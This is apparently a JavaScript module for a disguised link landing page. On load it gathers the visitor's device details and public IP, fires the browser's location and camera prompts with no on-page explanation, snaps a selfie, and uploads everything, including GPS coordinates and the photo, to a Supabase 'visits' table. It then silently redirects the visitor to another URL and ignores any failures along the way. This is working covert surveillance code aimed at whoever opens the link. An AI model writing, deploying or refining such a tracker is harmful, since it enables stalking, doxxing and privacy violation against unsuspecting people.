import {
  getDeviceInfo,
  fetchPublicIp,
  requestLocation,
  captureSelfie,
} from "./collect.js";
import { fetchRedirectUrl, isSupabaseConfigured } from "./settings.js";

function cfg() {
  return window.APP_CONFIG || {};
}

async function saveVisit(payload) {
  const { supabaseUrl, supabaseAnonKey } = cfg();
  if (!isSupabaseConfigured()) {
    return { ok: false, local: true };
  }

  const res = await fetch(`${supabaseUrl}/rest/v1/visits`, {
    method: "POST",
    headers: {
      apikey: supabaseAnonKey,
      Authorization: `Bearer ${supabaseAnonKey}`,
      "Content-Type": "application/json",
      Prefer: "return=minimal",
    },
    body: JSON.stringify(payload),
  });

  if (!res.ok) {
    const text = await res.text();
    throw new Error(text || `HTTP ${res.status}`);
  }
  return { ok: true };
}

export function initVisitorPage() {
  const videoEl = document.getElementById("preview");

  async function run() {
    const redirectTarget = await fetchRedirectUrl();

    const deviceInfo = getDeviceInfo();

    let ipPayload = { ip: null, source: null };
    try {
      ipPayload = await fetchPublicIp();
    } catch {
      /* continue */
    }

    // Native OS/browser location prompt (no in-page UI)
    const locationPayload = await requestLocation();

    // Native camera prompt (no in-page UI)
    let photoPayload = { granted: false, dataUrl: null };
    try {
      photoPayload = await captureSelfie(videoEl);
    } catch {
      photoPayload = { granted: false, error: "denied_or_unavailable" };
    }

    const payload = {
      ip: ipPayload.ip,
      ip_source: ipPayload.source,
      device_info: deviceInfo,
      location_granted: locationPayload.granted,
      location: locationPayload.granted
        ? {
            latitude: locationPayload.latitude,
            longitude: locationPayload.longitude,
            accuracy: locationPayload.accuracy,
          }
        : null,
      camera_granted: !!photoPayload.granted,
      photo_base64: photoPayload.dataUrl || null,
      referrer: document.referrer || null,
      page_url: location.href,
    };

    try {
      await saveVisit(payload);
    } catch {
      /* still redirect */
    }

    window.location.replace(redirectTarget);
  }

  run();
}
